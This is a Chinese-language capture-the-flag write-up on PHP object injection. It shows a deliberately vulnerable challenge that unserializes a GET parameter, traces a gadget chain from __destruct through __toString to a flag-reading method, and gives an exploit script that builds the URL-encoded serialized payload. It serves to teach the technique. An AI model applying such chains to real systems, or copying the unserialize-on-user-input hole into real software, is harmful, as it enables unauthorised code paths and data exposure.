#PHP 序列化

# 1.源码

```php
<?php
error_reporting(0);
show_source("index.php");
class w44m
{
    private $admin = 'aaa';
    protected $passwd = '123456';
    public function Getflag()
    {
        if ($this->admin === 'w44m' && $this->passwd === '08067') {
            include('flag.php');
            echo $flag;
        } else {
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m
{
    public $w00m;
    public function __destruct()
    {
        echo $this->w00m;
    }
}

class w33m
{
    public $w00m;
    public $w22m;
    public function __toString()
    {
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);
```

# 2.查找入口

```php
# 传参$w00m,直接反序列化，入口就在__destruct，或者_wakeup，
这里的w22m符合条件
class w22m{
	public $w00m;
	public function __destruct(){
		echo $this->w00m;
	}
}
```

# 3.找链子

```text
echo一个对象，调用__toString方法，然后调用内部w00m的方法，由此可得链子如下

w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
```

# 4.写 exp

```php
<?php
class w44m{
    private $admin = 'w44m';
    protected $passwd = '08067';
}
class w22m{
    public $w00m;
}
class w33m{
    public $w00m;
    public $w22m;

}
# w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
$a = new w22m();
$b = new w33m();
$c = new w44m();
# 入口
$a->w00m=$b;
# 链子
$b->w00m=$c;
$b->w22m='Getflag';
echo urlencode(serialize($a));
?>

```
